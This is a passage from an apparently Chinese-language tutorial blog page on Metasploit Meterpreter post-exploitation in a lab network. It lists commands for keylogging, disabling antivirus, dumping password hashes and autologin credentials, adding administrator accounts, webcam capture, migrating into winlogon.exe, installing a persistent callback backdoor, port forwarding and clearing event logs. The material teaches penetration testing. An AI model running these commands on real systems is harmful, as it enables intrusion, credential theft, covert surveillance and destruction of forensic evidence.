class="comment">#开启远程桌面</span></span><br><span class="line">keyscan_start                							<span class="comment">#开启键盘记录功能</span></span><br><span class="line">keyscan_dump                			 				<span class="comment">#显示捕捉到的键盘记录信息</span></span><br><span class="line">keyscan_stop                 							<span class="comment">#停止键盘记录功能</span></span><br><span class="line">uictl  <span class="built_in">disable</span>  keyboard     							<span class="comment">#禁止目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">enable</span>   keyboard     							<span class="comment">#允许目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">disable</span>  mouse        							<span class="comment">#禁止目标使用鼠标</span></span><br><span class="line">uictl  <span class="built_in">enable</span>   mouse        							<span class="comment">#允许目标使用鼠标</span></span><br><span class="line">load                        							<span class="comment">#使用扩展库</span></span><br><span class="line">run				             							<span class="comment">#使用扩展库</span></span><br><span class="line"> </span><br><span class="line">run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        <span class="comment">#会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀</span></span><br><span class="line">portfwd add -l 9999 -r 192.168.100.158 -p 3389     		<span class="comment">#将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span></span><br><span class="line">clearev                       <span class="comment">#清除日志</span></span><br></pre></td></tr></table></figure><h4 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post 后渗透模块"></a>Post 后渗透模块</h4><blockquote><p>该模块主要用于在取得目标主机系统远程控制权后<br>进行一系列的后渗透攻击动作</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate                			<span class="comment">#自动进程迁移</span></span><br><span class="line">run post/windows/gather/checkvm                			<span class="comment">#查看目标主机是否运行在虚拟机上</span></span><br><span class="line">run post/windows/manage/killav                			<span class="comment">#关闭杀毒软件</span></span><br><span class="line">run post/windows/manage/enable_rdp            			<span class="comment">#开启远程桌面服务</span></span><br><span class="line">run post/windows/manage/autoroute              			<span class="comment">#查看路由信息</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users    		<span class="comment">#列举当前登录的用户</span></span><br><span class="line">run post/windows/gather/enum_applications       		<span class="comment">#列举应用程序</span></span><br><span class="line">run post/windows/gather/credentials/windows_autologin 	<span class="comment">#抓取自动登录的用户名和密码</span></span><br><span class="line">run post/windows/gather/smart_hashdump               	<span class="comment">#dump出所有用户的hash</span></span><br></pre></td></tr></table></figure><p>可输入 <code>sysinfo</code> 查看目标主机的信息</p><h4 id="查看主机是否运行在虚拟机上"><a href="#查看主机是否运行在虚拟机上" class="headerlink" title="查看主机是否运行在虚拟机上"></a>查看主机是否运行在虚拟机上</h4><p>查看主机是否运行在虚拟机上，可以看出主机是在虚拟机环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><h4 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h4><p>拿到目标主机的 shell 后第一件事就是关闭掉目标主机的杀毒软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run  killav</span><br></pre></td></tr></table></figure><h4 id="获取目标主机的详细信息"><a href="#获取目标主机的详细信息" class="headerlink" title="获取目标主机的详细信息"></a>获取目标主机的详细信息</h4><p>使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scraper </span><br></pre></td></tr></table></figure><p>它将目标机器上的常见信息收集起来然后下载保存在本地</p><h4 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h4><p>Meterpreter 支持非常多的文件系统命令 (基本跟 Linux 系统命令类似)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span>     <span class="comment">#查看当前目录</span></span><br><span class="line"><span class="built_in">cd</span>      <span class="comment">#切换目标目录；</span></span><br><span class="line"><span class="built_in">cat</span>     <span class="comment">#读取文件内容；</span></span><br><span class="line"><span class="built_in">rm</span>      <span class="comment">#删除文件；</span></span><br><span class="line">edit    <span class="comment">#使用vim编辑文件</span></span><br><span class="line"><span class="built_in">ls</span>      <span class="comment">#获取当前目录下的文件；</span></span><br><span class="line"><span class="built_in">mkdir</span>   <span class="comment">#新建目录；</span></span><br><span class="line"><span class="built_in">rmdir</span>   <span class="comment">#删除目录； </span></span><br></pre></td></tr></table></figure><h4 id="上传-下载文件"><a href="#上传-下载文件" class="headerlink" title="上传 &#x2F; 下载文件"></a>上传 &#x2F; 下载文件</h4><h5 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download  file <span class="comment">#命令可以帮助我们从目标系统中下载文件</span></span><br></pre></td></tr></table></figure><h5 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload  file  <span class="comment">#命令则能够向目标系统上传文件。</span></span><br></pre></td></tr></table></figure><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>有的时候，你可能会发现自己的 <code>Meterpreter</code> 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动<br>比如说，<code>修改注册表</code>、<code>安装后门</code>或<code>导出密码</code>等活动都需要<code>提升用户权限</code><br>而 <code>Meterpreter</code> 给我们提供了一个 <code>getsystem</code> 命令<br>它可以使用多种技术在目标系统中实现提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line"><span class="comment">#命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。</span></span><br><span class="line">getsystem</span><br><span class="line"><span class="comment">#自动提权为系统权限</span></span><br></pre></td></tr></table></figure><h4 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h4><p><a href="../b034a3f3/">使用 MSF 抓取用户密码</a></p><h4 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h4><p>先查看目标主机安装了哪些应用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications  <span class="comment">#查看目标主机安装了哪些应用</span></span><br></pre></td></tr></table></figure><p>在 <code>meterpreter_shell</code> 命令行执行目标系统中的应用程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#execute命令用法：</span></span><br><span class="line">execute [参数] -f 指定的可执行文件</span><br><span class="line"></span><br><span class="line">-f：指定可执行文件</span><br><span class="line">-H：创建一个隐藏进程</span><br><span class="line">-a：传递给命令的参数</span><br><span class="line">-i：跟进程进行交互</span><br><span class="line">-m：从内存中执行</span><br><span class="line">-t：使用当前伪造的线程令牌运行进程</span><br><span class="line">-s：在给定会话中执行进程</span><br></pre></td></tr></table></figure><h4 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h4><p>截图目标主机屏幕，图片保存到 <code>/root/Desktop/</code> 下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot <span class="comment">#截图目标主机屏幕</span></span><br></pre></td></tr></table></figure><h4 id="创建一个新账号"><a href="#创建一个新账号" class="headerlink" title="创建一个新账号"></a>创建一个新账号</h4><p>先查看目标主机有哪些用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users  <span class="comment">#查看目标主机有用户</span></span><br></pre></td></tr></table></figure><p>在目标系统中创建一个新的用户账号的方法一</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run getgui -u 用户 -p 密码</span><br><span class="line">-u: 指定用户</span><br><span class="line">-p: 指定密码</span><br></pre></td></tr></table></figure><blockquote><p>这个命令会创建用户<br>并把他添加到 <code>Administrators</code> 组中<br>这样该用户就拥有远程桌面的权限了</p></blockquote><p>在目标系统中创建一个新的用户账号的方法二</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enable_rdp脚本:</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=test2 PASSWORD=Abc123456  <span class="comment">#添加用户</span></span><br><span class="line">run post/windows/manage/enable_rdp                                    <span class="comment">#开启远程桌面</span></span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=<span class="literal">true</span> LPORT=6662            <span class="comment">#将3389端口转发到6662</span></span><br></pre></td></tr></table></figure><h4 id="启用远程桌面"><a href="#启用远程桌面" class="headerlink" title="启用远程桌面"></a>启用远程桌面</h4><p>当我们新添加的用户已经拥有远程桌面之后<br>我们就可以使用这个账号凭证来开启远程桌面会话了</p><p>首先，我们需要确保目标 Windows 设备开启了远程桌面功能（需要开启多个服务）<br>我们输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p>命令可以开启远程桌面</p><p>在开启远程桌面会话之前<br>我们还需要使用 <code>idletime</code> 命令检查远程用户的空闲时长</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idletime <span class="comment">#检查远程用户的空闲时长</span></span><br></pre></td></tr></table></figure><p>开启远程桌面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>Meterpreter 还可以在目标设备上实现键盘记录功能<br>键盘记录主要涉及以下三种命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start  <span class="comment">#开启键盘记录功能，开关键盘记录功能后目标输入的内容我们就通过keyscan_dump命令在Meterpreter里面进行查看；</span></span><br><span class="line">keyscan_dump   <span class="comment">#显示捕捉到的键盘记录信息</span></span><br><span class="line">keyscan_stop   <span class="comment">#停止键盘记录功能</span></span><br></pre></td></tr></table></figure><blockquote><p>在使用键盘记录功能时<br>通常需要跟目标进程进行绑定<br>然后获取该进程下的键盘记录</p></blockquote><h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><p>Meterpreter 既可以单独运行<br>也可以与其他进程进行绑定<br>因此，我们可以让 <code>Meterpreter</code> 与类似 <code>explorer.exe</code> 这样的进程进行绑定<br>并以此来实现持久化</p><p>在下面的例子中<br>我们会将 <code>Meterpreter</code> 跟 <code>winlogon.exe</code> 绑定<br>并在登录进程中捕获键盘记录，以获得用户的密码</p><p>首先，我们需要使用 <code>ps</code> 命令查看目标设备中运行的进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure><p>使用 <code>getpid</code> 查看我们当前的进程 id</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getpid</span><br></pre></td></tr></table></figure><p>使用 <code>migrate + 目标进程ID</code> 命令来绑定目标进程 id<br>通过进程迁移后<br>当前的 <code>Meterpreter</code> 的 <code>pid</code> 已经和 <code>winlogon.exe</code> 一样了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 123</span><br></pre></td></tr></table></figure><p>这里绑定目标 <code>pid</code> 的时候，经常会断了 <code>shell</code><br>进程迁移后会自动关闭原来 <code>Meterpreter</code> 进程<br>没有关闭可使用 <code>kill pid</code> 命令关闭进程。</p><p>或者使用自动迁移进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure><p>系统会自动寻找合适的进程然后迁移</p><h4 id="禁止目标主机使用键盘鼠标"><a href="#禁止目标主机使用键盘鼠标" class="headerlink" title="禁止目标主机使用键盘鼠标"></a>禁止目标主机使用键盘鼠标</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uictl  <span class="built_in">disable</span>(<span class="built_in">enable</span>) keyboard  <span class="comment">#禁止(允许)目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">disable</span>(<span class="built_in">enable</span>) mouse     <span class="comment">#禁止(允许)目标使用鼠标</span></span><br></pre></td></tr></table></figure><h4 id="用目标主机摄像头拍照"><a href="#用目标主机摄像头拍照" class="headerlink" title="用目标主机摄像头拍照"></a>用目标主机摄像头拍照</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list    <span class="comment">#获取目标系统的摄像头列表</span></span><br><span class="line">webcam_snap    <span class="comment">#从指定的摄像头，拍摄照片</span></span><br><span class="line">webcam_stream  <span class="comment">#从指定的摄像头，开启视频</span></span><br></pre></td></tr></table></figure><h4 id="常用扩展库介绍"><a href="#常用扩展库介绍" class="headerlink" title="常用扩展库介绍"></a>常用扩展库介绍</h4><blockquote><p><code>Meterpreter</code> 中不仅有基本命令还有很多扩展库<br>下面就介绍一下常用的扩展库的查看方法</p></blockquote><h5 id="load-use-命令"><a href="#load-use-命令" class="headerlink" title="load&#x2F;use 命令"></a>load&#x2F;use 命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load/use     <span class="comment">#加载模块</span></span><br><span class="line">load -l      <span class="comment">#列出所有可用的扩展</span></span><br><span class="line">load -<span class="built_in">help</span>   <span class="comment">#帮助；说明</span></span><br></pre></td></tr></table></figure><p>命令 <code>load -l</code> 会列出所有可用的扩展</p><p>输入 <code>load</code> 后 <code>双击Tab键</code> 也可以列出可用扩展</p><h5 id="run-命令"><a href="#run-命令" class="headerlink" title="run 命令"></a>run 命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run   <span class="comment">#执行一个已有的模块</span></span><br></pre></td></tr></table></figure><p><code>run+双击Tab键</code> 会列出所有的已有的脚本；<br>常用的有 <code>autoroute</code> , <code>hashdump</code> , <code>arp_scanner</code> , <code>multi_meter_inject</code> 等</p><h4 id="生成持续性后门"><a href="#生成持续性后门" class="headerlink" title="生成持续性后门"></a>生成持续性后门</h4><blockquote><p>因为 <code>Meterpreter</code> 是基于 <code>内存DLL</code> 建立的连接<br>所以，只要目标主机关机，我们的连接就会断<br>总不可能我们每次想连接的时候，每次都去攻击<br>然后再利用 <code>Meterpreter</code> 建立连接<br>所以，我们得在目标主机系统内留下一个<code>持续性的后门</code><br>只要目标主机<code>开机</code>了，我们就可以连接到该主机</p></blockquote><p>建立持续性后门有两种方法</p><ul><li>通过启动项启动 <code>persistence</code></li><li>通过服务启动 <code>metsvc</code></li></ul><h5 id="启动项启动"><a href="#启动项启动" class="headerlink" title="启动项启动"></a>启动项启动</h5><p>先使用 <code>Msfvenonm</code> 生成一个后门木马<br>然后放到 <code>windows的启动目录</code> 中</p><blockquote><p>C:\Users$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br>这样这个后门每次开机就都能启动了<br>然后我们只要相连就监听相应的端口就行了</p></blockquote><h5 id="服务启动"><a href="#服务启动" class="headerlink" title="服务启动"></a>服务启动</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888 <span class="comment">#自动连接192.168.100.158的8888端口，缺点是容易被杀毒软件查杀</span></span><br></pre></td></tr></table></figure><p>然后它就在目标机新建了这个文件<br>C:\Windows\TEMP****.vbs<br>并把该服务加入了注册表中<br>只要开机就会启动</p><h4 id="PortFwd-端口转发"><a href="#PortFwd-端口转发" class="headerlink" title="PortFwd 端口转发"></a>PortFwd 端口转发</h4><p><code>portfwd</code> 是 <code>Meterpreter</code> 提供的一种基本的<code>端口转发</code><br><code>porfwd</code> 可以 <code>反弹单个端口</code> 到 <code>本地</code>, 并且 <code>监听</code><br>使用方法如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 9999 -r 192.168.100.158 -p 3389   </span><br><span class="line"><span class="comment">#将192.168.100.158的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span></span><br><span class="line">-l:   <span class="comment">#本地监听的端口，用于接收目标主机的端口反弹</span></span><br><span class="line">-p:   <span class="comment">#目标服务器的端口；</span></span><br><span class="line">add:  <span class="comment">#添加一个连接</span></span><br></pre></td></tr></table></figure><p>然后我们只要访问<code>本地</code>的 <code>3389</code> 端口就可以连接到<code>目标主机</code>的 <code>3389</code>端口了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:9999</span><br></pre></td></tr></table></figure><p>如果不想继续连接的话<br>可以删除当前建立的连接<br>执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd delet -l 9999 -r 192.168.100.158 -p 3389   </span><br><span class="line">delet   <span class="comment">#删除一个连接</span></span><br></pre></td></tr></table></figure><h4 id="清除事件日志"><a href="#清除事件日志" class="headerlink" title="清除事件日志"></a>清除事件日志</h4><p>完成攻击操作之后<br>千万别忘了 “打扫战场”<br>我们的所有操作都会被记录在目标系统的日志文件之中<br>因此我们需要在完成攻击之后使用以下命令来清除事件日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev  <span class="comment">#清除事件日志</span></span><br></pre></td></tr></table></figure><h3 id="导入并执行-PowerShell-脚本"><a href="#导入并执行-PowerShell-脚本" class="headerlink" title="导入并执行 PowerShell 脚本"></a>导入并执行 PowerShell 脚本</h3><p>如果 <code>powershell</code> 脚本是用于域内信息收集的<br>则获取到的权限用户需要是域用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">load powershell                           			<span class="comment">#加载powershell功能</span></span><br><span class="line">powershell_import /root/PowerView.ps1      			<span class="comment">#导入powershell脚本，提前将该powershell脚本放到指定目录</span></span><br><span class="line">powershell_execute Get-NetDomain           			<span class="comment">#执行该脚本下的功能模块Get-domain，该模块用于获取域信息，一个脚本下通常有多个功能模块;获取当前用户所在域的名称;</span></span><br><span class="line">powershell_execute Invoke-UserHunter      			<span class="comment">#该功能模块用于定位域管理员登录的主机;</span></span><br><span class="line">powershell_execute Get-NetForest           			<span class="comment">#该模块用于定位域信息</span></span><br><span class="line">powershell_execute Invoke-EnumerateLocalAdmin 	    <span class="comment">#枚举域中所有计算机上本地管理员组的成员</span></span><br></pre></td></tr></table></figure><h3 id="加载-stdapi"><a href="#加载-stdapi" class="headerlink" title="加载 stdapi"></a>加载 stdapi</h3><p>有时候虽然我们获取到了 <code>Meterpreter</code><br>但是执行一些命令会显示没有该命令<br>这时我们可以执行 <code>load stdapi</code> 来加载<br>这样我们就可以执行命令了</p><h3 id="升级-Session"><a href="#升级-Session" class="headerlink" title="升级 Session"></a>升级 Session</h3><p>有时候，当我们收到的不是 <code>Meterpreter</code> 类型的 <code>session</code> 的话<br>可能不好操作，我们可以执行命令 <code>sessions -u id</code> 来升级 <code>session</code><br>执行该命令，默认调用的是 <code>post/multi/manage/shell_to_meterpreter</code> 模块</p></div></article><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">首页</a></li><li><a href="/tags/">标签</a></li><li><a href="/tools/">工具</a></li><li><a href="/about/">关于</a></li><li><a href="/search/">搜索</a></li><li><a href="/friends/">友链</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit-Framework"><span class="toc-number">1.</span> <span class="toc-text">Metasploit Framework</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7"><span class="toc-number">1.3.</span> <span class="toc-text">Metasploit 的安装和更新升级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85-MSF"><span class="toc-number">1.3.1.</span> <span class="toc-text">一键安装 MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E7%9A%84%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7"><span class="toc-number">1.3.2.</span> <span class="toc-text">MSF 的更新升级</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E-kali-%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7-MSF"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">非 kali 环境下更新升级 MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kali-%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7-MSF"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">kali 环境下更新升级 MSF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-number">1.4.1.</span> <span class="toc-text">基础使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E4%B8%AD%E5%8A%A0%E8%BD%BD%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84-exploit%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.2.</span> <span class="toc-text">MSF 中加载自定义的 exploit模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-exploit"><span class="toc-number">1.4.3.</span> <span class="toc-text">漏洞利用 (exploit)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7-payload"><span class="toc-number">1.4.4.</span> <span class="toc-text">攻击载荷 (payload)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-%E6%A8%A1%E5%9D%97%E8%B7%AF%E5%BE%84"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">payload 模块路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit-%E4%B8%AD%E7%9A%84-Payload-%E6%A8%A1%E5%9D%97%E4%B8%BB%E8%A6%81%E6%9C%89%E4%BB%A5%E4%B8%8B%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">Metasploit 中的 Payload 模块主要有以下三种类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Meterpreter"><span class="toc-number">1.4.5.</span> <span class="toc-text">Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F"><span class="toc-number">1.4.5.1.</span> <span class="toc-text">Meterpreter 是如何工作的？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">1.4.5.2.</span> <span class="toc-text">Meterpreter 的特点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">1.4.6.</span> <span class="toc-text">MS17_010 (永恒之蓝)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.6.1.</span> <span class="toc-text">查找漏洞相关模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Auxiliary%E8%BE%85%E5%8A%A9%E6%8E%A2%E6%B5%8B%E6%A8%A1%E5%9D%97-%E5%AF%B9%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.6.2.</span> <span class="toc-text">利用 Auxiliary辅助探测模块 对漏洞进行探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Exploit%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97-%E5%AF%B9%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.6.3.</span> <span class="toc-text">使用 Exploit漏洞利用模块 对漏洞进行利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.6.4.</span> <span class="toc-text">Payload 攻击载荷模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5"><span class="toc-number">1.4.7.</span> <span class="toc-text">后渗透阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Post-%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.7.1.</span> <span class="toc-text">Post 后渗透模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E6%98%AF%E5%90%A6%E8%BF%90%E8%A1%8C%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A"><span class="toc-number">1.4.7.2.</span> <span class="toc-text">查看主机是否运行在虚拟机上</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="toc-number">1.4.7.3.</span> <span class="toc-text">关闭杀毒软件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.7.4.</span> <span class="toc-text">获取目标主机的详细信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.4.7.5.</span> <span class="toc-text">访问文件系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.7.6.</span> 